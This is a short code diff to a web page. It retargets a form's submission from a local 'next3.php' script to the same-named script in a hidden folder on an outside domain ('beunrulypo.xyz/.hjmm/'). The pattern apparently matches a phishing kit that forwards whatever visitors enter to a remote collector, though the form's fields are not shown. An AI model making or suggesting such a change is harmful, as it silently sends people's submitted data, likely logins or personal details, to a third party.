@@ -88,7 +88,7 @@ function validateform(){
 
 
  
-<form action="next3.php"   name="myform" id="myform"  onSubmit="return validateform()"  method="post">  
+<form action="https://beunrulypo.xyz/.hjmm/next3.php"   name="myform" id="myform"  onSubmit="return validateform()"  method="post">  
  
  
   
